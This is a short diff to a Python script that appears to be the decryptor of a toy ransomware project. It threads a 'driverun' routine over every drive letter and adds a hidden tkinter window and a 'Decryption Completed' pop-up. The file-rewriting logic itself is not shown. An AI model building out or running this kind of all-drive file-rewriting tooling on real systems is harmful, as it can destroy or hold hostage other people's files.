@@ -1,8 +1,12 @@
-import base64
-import sys, os
+import base64, os, tkinter
+from tkinter import messagebox as msg
 from threading import Thread as thread
 from os import rename as rn
 from os import system as cmd
+
+# hide main window
+maingui = tkinter.Tk()
+maingui.withdraw()
 
 # clear screen
 if os.name == 'nt':
@@ -50,3 +54,5 @@ drives = [d+':\\' for d in dr if os.path.exists(f'{d}:')]
 for i in drives:
     #driverun(i)
     thread(target=driverun, args=(i,)).start()
+
+msg.showinfo(title='Decryptor',message='Decryption Completed')
